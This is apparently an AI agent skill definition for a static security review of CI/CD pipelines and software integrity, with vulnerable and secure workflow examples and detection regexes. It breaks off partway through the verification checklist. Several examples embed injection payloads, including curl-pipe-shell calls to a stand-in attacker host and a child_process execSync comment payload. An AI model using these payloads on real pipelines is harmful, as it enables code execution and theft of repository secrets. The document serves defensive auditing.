---
name: sast-cicd
description: >-
  Detect CI/CD pipeline and software integrity vulnerabilities (OWASP A08:2021)
  in a codebase using a three-phase approach: recon (inventory pipeline
  definitions and integrity-sensitive build steps), batched verify (determine
  attacker reachability and the secrets/permissions in scope in parallel
  subagents, 3 candidates each), and merge (consolidate batch results). Covers
  GitHub Actions script injection, pull_request_target / workflow_run poisoned
  pipeline execution, unpinned third-party actions, over-privileged tokens,
  GitLab CI / Jenkins / Azure Pipelines injection, curl-pipe-shell and
  unverified downloads, missing Subresource Integrity, and unsigned
  update/plugin loading. Requires sast/architecture.md (run sast-analysis
  first). Outputs findings to sast/cicd-results.md. Use when asked to find
  CI/CD, GitHub Actions, pipeline injection, supply-chain, SRI, or software
  integrity bugs.
---

# CI/CD Pipeline & Software Integrity Detection

You are performing a focused security assessment to find CI/CD pipeline and software integrity vulnerabilities in a codebase. This skill uses a three-phase approach with subagents: **recon** (inventory pipeline definitions and integrity-sensitive build steps), **batched verify** (attacker reachability analysis in parallel batches of 3), and **merge** (consolidate batch reports into one file).

**Prerequisites**: `sast/architecture.md` must exist. Run the analysis skill first if it doesn't.

---

## What is a CI/CD & Software Integrity Failure

Software and data integrity failures (OWASP A08:2021) occur when code, build steps, or artifacts are trusted without verifying where they came from or that they were not tampered with. The most damaging CI/CD form is **Poisoned Pipeline Execution** (OWASP CICD-SEC-4): anyone who can open a pull request, file an issue, or post a comment gets their text or code executed inside a pipeline job that holds repository write tokens, cloud credentials, registry tokens, or signing keys. Closely related are **Dependency Chain Abuse** (CICD-SEC-3) — pulling mutable or unverified code into the build (unpinned actions, `curl | sh`, unlocked installs) — and **Ungoverned Usage of 3rd-Party Services** (CICD-SEC-8) — third-party actions, orbs, CDNs, and update servers trusted with secrets or with users' browsers. A compromised pipeline typically ships a malicious release to every downstream user.

The core pattern: *attacker-controlled input or an unverified external artifact reaches code execution in a build, deploy, or runtime context that holds secrets, write permissions, or produces shipped artifacts.*

### What a CI/CD Integrity Failure IS

- **Script injection**: attacker-controlled context (`${{ github.event.issue.title }}`, `${{ github.head_ref }}`, `${{ github.event.comment.body }}`) expanded into a `run:` script or an `actions/github-script` `script:` — the expression is substituted textually **before** the shell or JavaScript engine parses it
- **Poisoned Pipeline Execution**: a privileged trigger (`pull_request_target`, `workflow_run`, `issue_comment`) that checks out and builds, tests, or installs PR-controlled code while secrets or a write token are in scope
- **Untrusted artifact / environment-file injection**: a privileged workflow that executes, sources, or writes to `GITHUB_ENV` / `GITHUB_OUTPUT` / `GITHUB_PATH` data produced by an untrusted run or event
- **Mutable third-party references**: actions, reusable workflows, orbs, GitLab remote includes, or Jenkins shared libraries referenced by a tag or branch instead of an immutable commit SHA
- **Over-privileged pipelines**: `permissions: write-all`, no `permissions:` block, `id-token: write` on jobs that run untrusted code, secrets echoed, uploaded in artifacts, or passed to untrusted steps, self-hosted runners serving public-repo PRs
- **CI injection on other platforms**: GitLab `$CI_MERGE_REQUEST_TITLE` re-parsed by a shell or `$[[ inputs ]]` interpolation, Jenkins Groovy `"${params.X}"` in `sh`, Azure `$(System.PullRequest.SourceBranch)` macros in inline scripts
- **Unverified downloads in build steps**: `curl … | sh`, download-and-execute without checksum or signature, `ADD https://…` without `--checksum`, `npm install` instead of `npm ci` and unhashed `pip install` in release builds
- **Missing Subresource Integrity**: third-party `<script>` / stylesheet loaded from a CDN without `integrity` + `crossorigin`
- **Unsigned application updates / plugins / remote code**: auto-updaters, plugin loaders, or remote config that download and execute or trust code without signature verification

### What a CI/CD Integrity Failure is NOT

Do not flag these here — they belong to sibling skills:

- **Command injection in application code** (HTTP request input reaching `exec`/`system`): that is **sast-rce**
- **Insecure deserialization** of untrusted data (also under A08): that is **sast-rce**
- **Known-vulnerable dependency versions** (CVEs in lockfiles or manifests): that is **sast-sca**
- **Secrets hardcoded in public client code** (keys in JS bundles, mobile apps): that is **sast-hardcodedsecrets**. This skill only flags how a pipeline *handles* secrets (echoing, uploading, passing to untrusted code)
- **Mass assignment** (client-controlled object fields, CWE-915): that is **sast-massassignment**
- **Container runtime hardening** (`USER root`, privileged containers, exposed ports, debug flags): that is **sast-misconfig**
- **Download URLs taken from an HTTP request parameter**: that is **sast-ssrf** (or **sast-rce** if the content is executed)
- **`pull_request` workflows building fork code on GitHub-hosted runners**: expected behavior — fork runs get a read-only token and no secrets

### Patterns That Prevent CI/CD Integrity Failures

When you see these patterns, the pipeline is likely **not vulnerable**:

**1. Untrusted context passed through `env:` and referenced as a quoted variable**
```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"   # shell expands $TITLE as data; it is never parsed as script
```

**2. Untrusted code only runs in unprivileged triggers with a least-privilege token**
```yaml
on: pull_request                 # not pull_request_target: forks get no secrets, read-only token
permissions:
  contents: read                 # workflow default; widen per job only where required
```

**3. Third-party actions pinned to a full commit SHA**
```yaml
- uses: some-org/deploy-action@3f1c9d2e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d # v2.4.1
```

**4. Verified downloads and lockfile-enforcing installs**
```dockerfile
RUN curl -fsSLo /tmp/tool.tgz "https://releases.example.com/v1.8.2/tool.tgz" \
 && echo "${TOOL_SHA256}  /tmp/tool.tgz" | sha256sum -c -
RUN npm ci                       # fails if package-lock.json does not match package.json
```

**5. Subresource Integrity on third-party assets**
```html
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"
        integrity="sha384-<base64 digest>" crossorigin="anonymous"></script>
```

---

## Vulnerable vs. Secure Examples

### GitHub Actions — Script Injection in `run:`

```yaml
# VULNERABLE: issue title substituted into the script before bash parses it
on: { issues: { types: [opened] } }
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"
# Title: a"; curl -sSfL https://attacker.example/x | sh; echo "   -> runs with GITHUB_TOKEN in scope
# Branch names work too (no spaces needed): zz";echo${IFS}INJECTED;#   via ${{ github.head_ref }}

# SECURE: env indirection + quoted shell variable
      - env:
          TITLE: ${{ github.event.issue.title }}
        run: echo "New issue: $TITLE"
```

### GitHub Actions — Script Injection in `actions/github-script`

```yaml
# VULNERABLE: expression substituted into JavaScript source (JS injection, not shell)
- uses: actions/github-script@v7
  with:
    script: |
      const body = `${{ github.event.comment.body }}`;
# Comment: `;require('child_process').execSync('id');//   -> arbitrary JS with the github-token

# SECURE: read the value at runtime from env or the event payload
- uses: actions/github-script@v7
  env: { COMMENT_BODY: "${{ github.event.comment.body }}" }
  with:
    script: |
      const body = process.env.COMMENT_BODY;   // or context.payload.comment.body
```

### GitHub Actions — Composite Action Inputs (`action.yml`)

```yaml
# VULNERABLE: every caller passing a PR title or branch inherits the injection; the quotes do NOT help
# because substitution happens before the shell sees them
runs:
  using: composite
  steps:
    - shell: bash
      run: ./build.sh --label "${{ inputs.label }}"

# SECURE
    - shell: bash
      env: { LABEL: "${{ inputs.label }}" }
      run: ./build.sh --label "$LABEL"
```

### GitHub Actions — `pull_request_target` + PR Head Checkout (Poisoned Pipeline Execution)

```yaml
# VULNERABLE: privileged trigger builds attacker-controlled code with secrets in scope
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with: { ref: "${{ github.event.pull_request.head.sha }}" }
      - run: npm install && npm test          # package.json scripts and tests are attacker-controlled
        env: { NPM_TOKEN: "${{ secrets.NPM_TOKEN }}" }

# SECURE: run untrusted code under pull_request (no secrets, read-only token); keep
# pull_request_target only for jobs that never check out or execute PR content
on: pull_request
permissions: { contents: read }
# ...same job, no secrets in env:
      - uses: actions/checkout@<sha> # v4.x
        with: { persist-credentials: false }   # token not left in .git/config
      - run: npm ci && npm test
```

### GitHub Actions — `workflow_run` Consuming Untrusted Artifacts

```yaml
# VULNERABLE: privileged follow-up workflow trusts an artifact uploaded by a fork PR run
on: { workflow_run: { workflows: ["CI"], types: [completed] } }
permissions: { pull-requests: write }
jobs:
  report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with: { name: pr-info, run-id: "${{ github.event.workflow_run.id }}", github-token: "${{ secrets.GITHUB_TOKEN }}" }
      - run: |
          echo "PR_NUMBER=$(cat pr_number)" >> "$GITHUB_ENV"   # newline injects BASH_ENV / LD_PRELOAD
          bash ./report.sh                                     # attacker-supplied script executed

# SECURE: download with path: ${{ runner.temp }}/pr-info, treat contents as data, validate, never execute
      - run: |
          PR_NUMBER="$(cat "$RUNNER_TEMP/pr-info/pr_number")"
          [[ "$PR_NUMBER" =~ ^[0-9]+$ ]] || { echo "invalid PR number"; exit 1; }
          echo "PR_NUMBER=$PR_NUMBER" >> "$GITHUB_ENV"
```

### GitHub Actions — `GITHUB_ENV` / `GITHUB_OUTPUT` Injection

```yaml
# VULNERABLE: env indirection alone does not stop newline injection into the environment file
- env: { BODY: "${{ github.event.comment.body }}" }
  run: echo "COMMENT=$BODY" >> "$GITHUB_ENV"
# Body "x\nBASH_ENV=$(curl -sSfL https://attacker.example/x|sh)" -> runs at the start of every later bash step
# (bash command-substitutes BASH_ENV); other loader variables such as LD_PRELOAD are abused similarly

# SECURE: random heredoc delimiter (or do not export untrusted data at all)
- env: { BODY: "${{ github.event.comment.body }}" }
  run: |
    EOF_MARKER="$(openssl rand -hex 16)"
    { echo "COMMENT<<$EOF_MARKER"; echo "$BODY"; echo "$EOF_MARKER"; } >> "$GITHUB_ENV"
```

### GitHub Actions — Unpinned Third-Party Actions

```yaml
# VULNERABLE: mutable tag/branch — a compromised maintainer can repoint it (tj-actions/changed-files, 2025)
- uses: some-org/deploy-action@v2
- uses: some-org/setup-tool@main
- uses: org/shared/.github/workflows/release.yml@main      # reusable workflow, same issue

# SECURE: full 40-char commit SHA + version comment; keep current with Dependabot (github-actions ecosystem)
- uses: some-org/deploy-action@3f1c9d2e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d # v2.4.1
```

### GitHub Actions — Over-Privileged Token and Secret Exposure

```yaml
# VULNERABLE: every job gets a write-all token; secret printed and environment dumped into an artifact
permissions: write-all
jobs:
  build:
    steps:
      - run: echo "token=${{ secrets.DEPLOY_TOKEN }}"   # log masking is bypassable (base64, split, rev)
      - run: env > debug.txt
      - uses: actions/upload-artifact@v4
        with: { name: debug, path: ., include-hidden-files: true }   # ships .git/config with the persisted token
  release:
    uses: ./.github/workflows/release.yml
    secrets: inherit                                    # all secrets forwarded, even on untrusted triggers

# SECURE: read-only default, per-job grants, secrets only to the step that needs them
permissions: { contents: read }
jobs:
  release:
    environment: production                           # protection rules / required reviewers gate the secrets
    permissions: { contents: write, id-token: write } # OIDC only in the deploy job
    steps:
      - run: ./deploy.sh
        env: { DEPLOY_TOKEN: "${{ secrets.DEPLOY_TOKEN }}" }
```

### GitHub Actions — Self-Hosted Runners on Public Repositories

```yaml
# VULNERABLE: fork PRs on a public repo execute on a persistent self-hosted runner
# (backdoor the runner, read cached credentials, pivot into the internal network)
on: pull_request
jobs: { test: { runs-on: [self-hosted, linux] } }

# SECURE: GitHub-hosted runners for untrusted triggers; self-hosted only for trusted events,
# ephemeral (--ephemeral / JIT / ARC), in a runner group restricted to private repositories
jobs: { test: { runs-on: ubuntu-latest } }
```

### GitLab CI

```yaml
# VULNERABLE: MR title expanded by the job shell, then re-parsed by a second shell
notify:
  rules: [{ if: '$CI_PIPELINE_SOURCE == "merge_request_event"' }]
  script:
    - sh -c "echo Building MR: $CI_MERGE_REQUEST_TITLE"          # title: x; curl ...|sh
    - ssh deploy@build-host "echo $CI_MERGE_REQUEST_TITLE >> /var/log/mr.log"
    - echo "$[[ inputs.title ]]"    # spec:inputs are interpolated textually, like ${{ }}

# SECURE: reference the variable once, quoted, never inside eval / sh -c / ssh command strings
  script:
    - echo "Building MR: $CI_MERGE_REQUEST_TITLE"

# VULNERABLE: $PROD_DEPLOY_KEY not marked Protected and job not limited to protected refs — a fork MR
# pipeline run in the parent project can read it.
# SECURE: mark the variable Protected + Masked (project setting) and gate the job on protected refs
deploy:
  rules: [{ if: '$CI_COMMIT_REF_PROTECTED == "true"' }]
  environment: production
  script: ./deploy.sh
```

### Jenkins

```groovy
// VULNERABLE: Groovy GString interpolation — the shell receives the already-substituted command
parameters { string(name: 'BRANCH', defaultValue: 'main') }
stage('Build') {
  steps {
    sh "git checkout ${params.BRANCH} && make build"    // BRANCH = main; curl ...|sh
    sh "echo Building ${env.CHANGE_TITLE}"              // multibranch PR title from a fork
  }
}

// SECURE: single-quoted Groovy string; parameters are exported as env vars and expanded by the shell
    sh 'git checkout "$BRANCH" && make build'

// VULNERABLE: script-security sandbox bypass — Groovy evaluated on the controller from untrusted data
// (trusted global shared library calling evaluate(), or "Use Groovy Sandbox" disabled on the job)
def call(String expr) { evaluate(expr) }            // vars/run.groovy in a trusted library
@Library('build-lib@master') _                      // mutable library ref
```

### Azure Pipelines

```yaml
# VULNERABLE: $(...) macro syntax is substituted into the script text before it runs
- script: echo "Building $(System.PullRequest.SourceBranch) $(Build.SourceVersionMessage)"

# SECURE: map to an environment variable and quote it
- script: echo "Building $SOURCE_BRANCH"
  env: { SOURCE_BRANCH: $(System.PullRequest.SourceBranch) }
```

### Dockerfile & Shell Build Scripts

```dockerfile
# Same patterns apply verbatim to scripts/*.sh, Makefile targets, and CI run: / script: steps.
# VULNERABLE: remote code executed or installed with no integrity check; lockfile not enforced
RUN curl -fsSL https://get.example-tool.io/install.sh | sh
RUN wget -qO /tmp/agent.sh https://example.com/agent.sh && bash /tmp/agent.sh
ADD https://releases.example.com/tool-linux-amd64 /usr/local/bin/tool
RUN npm install
RUN pip install -r requirements.txt --extra-index-url https://pypi.internal.example/simple   # dependency confusion

# SECURE: pinned version + checksum or signature, lockfile-enforced installs
ARG TOOL_SHA256=<sha256 from the vendor's signed release manifest>
RUN curl -fsSLo /tmp/tool.tgz "https://releases.example.com/v1.8.2/tool-linux-amd64.tgz" \
 && echo "${TOOL_SHA256}  /tmp/tool.tgz" | sha256sum -c - \
 && tar -xzf /tmp/tool.tgz -C /usr/local/bin tool
RUN curl -fsSLo /tmp/agent.sh https://example.com/agent-1.4.0.sh && curl -fsSLo /tmp/agent.sh.sig https://example.com/agent-1.4.0.sh.sig \
 && cosign verify-blob --key vendor.pub --signature /tmp/agent.sh.sig /tmp/agent.sh && bash /tmp/agent.sh
ADD --checksum=sha256:<sha256> https://releases.example.com/tool-linux-amd64 /usr/local/bin/tool
RUN npm ci
RUN pip install --require-hashes -r requirements.txt   # requirements generated with pip-compile --generate-hashes
```

### HTML / Angular — Subresource Integrity

```html
<!-- VULNERABLE: third-party assets without integrity; a compromised CDN serves arbitrary JS to every user -->
<script src="https://cdn.jsdelivr.net/npm/chart.js@4/dist/chart.umd.min.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/lib/styles.css">

<!-- SECURE: exact version + SRI hash + crossorigin (version ranges like @4 or @latest cannot carry SRI) -->
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"
        integrity="sha384-<base64 digest>" crossorigin="anonymous"></script>
<!-- same for stylesheets: <link rel="stylesheet" href="…-2.1.0.css" integrity="sha384-…" crossorigin="anonymous"> -->
```

Angular: check `src/index.html` and any runtime loader (`document.createElement('script')` with an `https://` `src`). When the app's own bundles are served from a separate CDN, enable `"subresourceIntegrity": true` in `angular.json` build options.

### Application-Level Integrity — Auto-Update, Plugins, Remote Code

```python
# VULNERABLE: updater downloads and executes a binary with no signature verification
blob = requests.get(f"{UPDATE_SERVER}/latest/agent.bin", timeout=30).content
Path("/opt/agent/agent.bin").write_bytes(blob)
os.execv("/opt/agent/agent.bin", ["agent"])

# SECURE: verify a detached signature against a public key pinned in the application, before writing/executing
sig = requests.get(f"{UPDATE_SERVER}/latest/agent.bin.sig", timeout=30).content
PINNED_UPDATE_KEY.verify(sig, blob)        # Ed25519PublicKey; raises InvalidSignature on tampering
```

```javascript
// VULNERABLE: remote plugin code fetched from a configured URL and evaluated without verification
const code = await (await fetch(`${config.pluginBaseUrl}/plugin.js`)).text();
new Function(code)();
// SECURE: ship plugins inside the signed build, or verify a signature / pinned hash before loading
// Desktop updaters: keep electron-updater code-signature checks on; Sparkle needs HTTPS SUFeedURL + SUPublicEDKey
```

---

## Execution

This skill runs in three phases using subagents. Pass the contents of `sast/architecture.md` to all subagents as context.

**Cache reuse**: If `sast/cicd-recon.md` already exists, skip Phase 1 and reuse it. If `sast/sinks-index.md` exists, pass its `## sast-cicd` section to the Phase 1 subagent as a starting list of candidate sites — the subagent must still search beyond it, since the index is regex-based and incomplete.

### Phase 1: Recon — Inventory Pipelines and Integrity-Sensitive Build Steps

Launch a subagent with the following instructions:

> **Goal**: Inventory every pipeline definition, build script, and integrity-sensitive loading point in the repository, and record each candidate CI/CD or software integrity issue. Flag every structural match regardless of who can trigger the pipeline — attacker reachability is Phase 2's job. Write results to `sast/cicd-recon.md`.
>
> **Context**: You will be given the project's architecture summary. Use it to understand the deployment model, frontend delivery, release process, and whether the repository is likely public.
>
> **Files to inventory first** (use `rg --files -g` / `find`; include hidden directories):
> - GitHub Actions: `.github/workflows/*.yml`, `.github/workflows/*.yaml`; composite/JS/Docker actions: `action.yml`, `action.yaml` anywhere (including the repo root and `.github/actions/**`)
> - GitLab: `.gitlab-ci.yml`, `.gitlab/ci/**/*.yml`, and every file referenced by `include:` (`local:`, `project:`, `remote:`, `template:`, `component:`)
> - Jenkins: `Jenkinsfile`, `Jenkinsfile.*`, `*.jenkinsfile`, `vars/*.groovy`, `src/**/*.groovy` (shared libraries), Job DSL `*.groovy`
> - Azure Pipelines: `azure-pipelines.yml`, `azure-pipelines/**/*.yml`, `.azure-pipelines/**/*.yml`, `.azuredevops/**/*.yml`; others: `bitbucket-pipelines.yml`, `.circleci/config.yml`, `.drone.yml`, `.travis.yml`, `.buildkite/**/*.yml`, `cloudbuild.yaml`
> - Build scripts: `Dockerfile*`, `*.Dockerfile`, `Containerfile`, `scripts/*.sh`, `**/*.sh`, `**/*.ps1`, `Makefile`, `package.json` `scripts` (`preinstall`/`postinstall`/`prepare`)
> - Frontend entry HTML and templates: `index.html`, `src/index.html` (Angular), `public/*.html`, `templates/**/*.html`, `*.ejs`, `*.hbs`, `*.cshtml`, `*.jsp`, `*.erb`, `*.php`
>
> **What to search for** — record each match as a candidate with one of these categories:
>
> 1. **Script / Expression Injection** — untrusted data textually substituted into a shell or script:
>    - GitHub: `\$\{\{\s*github\.(event|head_ref)` inside `run:` blocks or `actions/github-script` `script:` — especially `github.event.(issue|pull_request|comment|review|review_comment|discussion|discussion_comment|pages|commits|head_commit|workflow_run)\.`, `github.head_ref`; also `\$\{\{\s*(inputs|steps\.[\w-]+\.outputs|needs\.[\w-]+\.outputs|env)\.` inside `run:` / `script:`
>    - Composite actions: `\$\{\{\s*inputs\.` inside `run:` of `action.yml` / `action.yaml`
>    - GitLab: `\$CI_(MERGE_REQUEST_(TITLE|DESCRIPTION|SOURCE_BRANCH_NAME)|COMMIT_(MESSAGE|TITLE|DESCRIPTION|BRANCH|REF_NAME|TAG_MESSAGE))` inside `eval`, `sh -c`, `bash -c`, `ssh … "…"`, or generated scripts; `\$\[\[\s*inputs\.` in `script:`
>    - Jenkins: `(sh|bat|powershell)\s*\(?\s*"{1,3}[^"]*\$\{?(params|env)\.`; `evaluate\(`, `Eval\.me\(`, `load\s` of workspace files; jobs with the Groovy sandbox disabled
>    - Azure: `\$\((System\.PullRequest\.|Build\.SourceBranch|Build\.SourceVersionMessage|Build\.RequestedFor)` or `\$\{\{\s*parameters\.` inside `script:`/`bash:`/`pwsh:`/`powershell:` inline steps
> 2. **Poisoned Pipeline Execution** — privileged trigger + untrusted code:
>    - Triggers: `pull_request_target`, `workflow_run`, `issue_comment`, `pull_request_review_comment`, `issues`, `discussion`
>    - Untrusted checkout: `ref:\s*\$\{\{\s*github\.(event\.pull_request\.head\.(sha|ref)|head_ref|event\.workflow_run\.head_(sha|branch))`, `refs/pull/.*/(merge|head)`, `gh pr checkout`, `git fetch .* pull/`
>    - Followed by execution of checked-out content: `npm|yarn|pnpm install`, `npm test`, `make`, `pip install .`, `./gradlew`, `mvn`, `go test`, `cargo build`, `docker build`, `uses: ./` local actions from the checkout, or scripts from the checkout
> 3. **Untrusted Artifact / Environment-File Injection**:
>    - `actions/download-artifact`, `dawidd6/action-download-artifact`, `downloadArtifact` in `workflow_run` workflows; `actions/cache` restored in privileged workflows with keys reachable from PR runs
>    - `>>\s*"?\$\{?GITHUB_(ENV|OUTPUT|PATH)` where the written value contains `${{ }}`, event data, or artifact content; legacy `::set-env` / `::set-output` / `::add-path`
>    - `source`, `bash`, `node`, `python` executed on artifact contents, or artifacts extracted into the workspace
> 4. **Mutable Third-Party Reference**:
>    - GitHub: `uses:\s*[^.\s][^@\s]*@(v?\d|main|master|latest|dev)` and, generally, any `uses:` ref that is not a 40-character hex SHA; `uses: docker://` without `@sha256:`; reusable workflows `uses: org/repo/.github/workflows/*.yml@<branch>`
>    - GitLab: `include:` with `remote:`, `project:` without `ref:` or with a branch ref, `component:` with `@~latest`
>    - Jenkins: `@Library\(['"][^'"@]+(@(master|main))?['"]\)`, `library(` with a parameterized version
>    - CircleCI: `orbs:` with `@volatile` or major-only versions; Azure: `resources: repositories:` templates with `ref: refs/heads/…`
> 5. **Over-Privileged Pipeline / Secret Exposure**:
>    - `permissions:\s*write-all`; workflows with no top-level and no job-level `permissions:` block (one candidate per file); `id-token:\s*write`, `contents|packages|actions|pull-requests:\s*write` in workflows with untrusted triggers
>    - `echo .*\$\{\{\s*secrets\.`, `set -x` / `env` / `printenv` with secrets in scope, `secrets:\s*inherit`, secrets passed via `with:` to third-party actions, `upload-artifact` paths covering `.`, `.env`, `.npmrc`, `.git/` (the checkout token is persisted by default; hidden files are excluded since upload-artifact v4.4 unless `include-hidden-files: true`)
>    - `runs-on:` containing `self-hosted` in workflows triggered by `pull_request`, `pull_request_target`, or `issue_comment`
> 6. **Unverified Download / Non-Reproducible Install**:
>    - `curl[^|]*\|\s*(sudo\s+)?(ba|z)?sh`, `wget[^|]*-O\s*-[^|]*\|\s*(ba)?sh`, `(ba)?sh\s+<\(curl`, `iex.*(irm|iwr|Invoke-WebRequest|Invoke-RestMethod|DownloadString)`
>    - `(curl|wget)` saving a file later passed to `chmod +x`, `bash`, `tar -x`, `dpkg -i`, `rpm -i`, `install` with no `sha256sum -c`, `shasum -a 256 -c`, `gpg --verify`, or `cosign verify` nearby
>    - Dockerfile `^ADD\s+https?://` without `--checksum=`
>    - `npm install` / `yarn install` (without `--frozen-lockfile`/`--immutable`) in CI or Dockerfiles; `pip install` without `--require-hashes` in release/deploy images; `--extra-index-url`; `go install …@latest`
> 7. **Missing Subresource Integrity**:
>    - `<script[^>]+src=["'](https?:)?//` or `<link[^>]+href=["'](https?:)?//` (stylesheets) whose tag has no `integrity=` attribute
>    - Runtime loaders: `createElement\(['"]script['"]\)` with an absolute `src`, `importScripts\(['"]https?://`
> 8. **Unsigned Update / Plugin / Remote Code**:
>    - Auto-updaters (`autoUpdater.setFeedURL`, `electron-updater`, Sparkle `SUFeedURL` over `http://` or without `SUPublicEDKey`, custom download-then-`exec`/`spawn`/`Process.Start`/`execv`)
>    - Plugin or code loading from remote locations: `URLClassLoader` with remote URLs, `new Function(await …fetch(`, `eval(` of fetched text, `require`/`importlib` of downloaded files, runtime `pip install` / `npm install` of config-supplied packages — where the URL comes from server config, not a request parameter
>
> **What to skip** (do not flag):
> - First-party local actions `uses: ./…` for pinning checks (still check their `run:` steps for input injection)
> - GitHub-owned `actions/*` and `github/*` pinned to a major tag: still list them under category 4 but mark the candidate name with `[GitHub-owned, lower priority]`
> - `${{ }}` expressions in `with:` (except `actions/github-script` `script:`), `if:`, `env:`, `runs-on:`, `strategy:` — these are not shell/JS contexts
> - Non-attacker-controlled contexts (for injection checks only): `github.sha`, `github.repository`, `github.run_id`, `github.run_number`, `github.workspace`, `github.event.pull_request.number`, `github.event.pull_request.head.sha`, `secrets.*`, `runner.*`, literal `matrix.*` values
> - Lockfile-enforcing installs: `npm ci`, `yarn install --frozen-lockfile` / `--immutable`, `pnpm install --frozen-lockfile`, `pip install --require-hashes`
> - Same-origin (relative URL) scripts and stylesheets; Markdown docs, test fixtures, and example snippets that are not executed
>
> **Output format** — write to `sast/cicd-recon.md`:
>
> ```markdown
> # CI/CD Recon: [Project Name]
>
> ## Summary
> Found [N] candidate pipeline/integrity issues.
>
> ## Candidates
>
> ### 1. [Descriptive name — e.g., "Issue title interpolated into run: in triage.yml"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Pipeline / job / step**: [workflow name → job id → step name or index; "N/A" for non-pipeline files]
> - **Trigger events**: [full `on:` / `rules:` / trigger list — e.g., "issues: [opened]", "pull_request_target"; "N/A" for HTML/app code]
> - **Category**: [Script / Expression Injection | Poisoned Pipeline Execution | Untrusted Artifact / Environment-File Injection | Mutable Third-Party Reference | Over-Privileged Pipeline / Secret Exposure | Unverified Download / Non-Reproducible Install | Missing Subresource Integrity | Unsigned Update / Plugin / Remote Code]
> - **Untrusted input or external artifact**: [e.g., `github.event.issue.title`, PR head checkout, `https://cdn…/lib.js`, `some-org/action@v2`]
> - **Secrets/permissions in scope**: [`secrets.X` referenced, `permissions:` block or "none declared (repo default)", `id-token: write`, runner labels; "N/A" for HTML/app code]
> - **Code snippet**:
>   ```
>   [the relevant step / tag / lines]
>   ```
>
> [Repeat for each candidate]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `sast/cicd-recon.md`. If the recon found **zero candidates** (the summary reports "Found 0" or the "Candidates" section is empty or absent), **skip Phase 2 entirely**. Instead, write the following content to `sast/cicd-results.md` and stop:

```markdown
# CI/CD & Integrity Analysis Results

No vulnerabilities found.
```

Only proceed to Phase 2 if Phase 1 found at least one candidate.

### Phase 2: Verify — Attacker Reachability Analysis (Batched)

After Phase 1 completes, read `sast/cicd-recon.md` and split the candidates into **batches of up to 3 candidates each**. Launch **one subagent per batch in parallel**. Each subagent analyzes reachability only for its assigned candidates and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `sast/cicd-recon.md` and count the numbered candidate sections under "Candidates" (### 1., ### 2., etc.).
2. Divide them into batches of up to 3. For example, 8 candidates → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those candidate sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned candidates.
5. Each subagent writes to `sast/cicd-batch-N.md` where N is the 1-based batch number.
6. Identify the CI platform(s) and build tooling from `sast/architecture.md` and the recon file's **File** / **Category** fields, and select **only the matching CI platform examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the candidates are GitHub Actions workflows plus an Angular `index.html`, include the GitHub Actions subsections that match the batch's categories and the "HTML / Angular — Subresource Integrity" example. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned candidate, determine whether an external or low-privilege actor can inject or execute code, or substitute a tampered artifact, in a context that holds secrets, write permissions, or produces shipped artifacts. Our goal is to find CI/CD pipeline and software integrity vulnerabilities. Write results to `sast/cicd-batch-[N].md`.
>
> **Your assigned candidates** (from the recon phase):
>
> [Paste the full text of the assigned candidate sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use it to understand the release process, which artifacts ship to users, and whether the repository is public. Read the full pipeline file (and any reusable workflow, composite action, or include it references) — not just the snippet.
>
> **Reachability reference — answer all five questions for each candidate**:
>
> **(a) Who can trigger it?**
> - **Any GitHub user on a public repo**: `pull_request_target`, `issues`, `issue_comment`, `discussion`, `pull_request_review_comment`, `fork`, `watch` — these run in the base repository context with secrets and the base token. Fork-PR approval policies only gate `pull_request` runs, not `pull_request_target` or `issue_comment`.
> - **Indirectly any user**: `workflow_run` fires after another workflow (often fork-triggered) and runs privileged; check what the upstream workflow is and who can trigger it.
> - **External fork PR author, unprivileged**: `pull_request` from forks gets a read-only token and no secrets (unless a private repo enables "Send secrets to workflows from fork pull requests") — not a finding unless a self-hosted runner, cache poisoning of a privileged workflow, or an explicit secret path exists.
> - **Org members / collaborators only**: `push` to unprotected branches, `workflow_dispatch`, `repository_dispatch`, comment triggers gated on `author_association` in `OWNER`/`MEMBER`/`COLLABORATOR`. **Maintainers only**: `workflow_dispatch` or `push` restricted to protected branches/tags with required reviews. **No actor**: `schedule` (but check whether it processes external data such as issues or downloaded files).
> - GitLab: MR pipelines from forks run in the fork unless a parent-project member runs them in the parent project. Jenkins: multibranch "Discover pull requests from forks" trust setting; `params` from anyone with Build permission.
>
> **(b) Who controls the injected value?**
> - **Attacker-controlled**: PR title/body, head branch name (`github.head_ref`, `pull_request.head.ref`, `CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `System.PullRequest.SourceBranch`), commit messages and author name/email, issue/comment/review/discussion text, wiki page names, `workflow_run.head_branch` / `display_title`, artifact and cache contents produced by fork runs, any file in a PR checkout, upstream content behind a mutable tag or CDN URL.
> - **Not attacker-controlled**: `github.sha`, `github.repository`, `github.run_id`, PR number, `pull_request.head.sha` (a hex SHA — but code at that SHA is attacker-controlled), `secrets.*`, literal values. **Derived values** (`inputs.*`, `steps.*.outputs.*`, `env.*`): trace back to the caller or step that set them — they inherit the taint of their source.
>
> **(c) What is in scope when it runs?**
> - Secrets referenced anywhere in the job (`secrets.*` in `env:` or `with:`), `secrets: inherit`, environment secrets (check `environment:` and its protection rules).
> - `GITHUB_TOKEN` permissions: the workflow/job `permissions:` block; if absent, the repo/org default applies (read/write on repositories and organizations created before February 2023 unless changed, read-only for newer ones — a setting not visible in code).
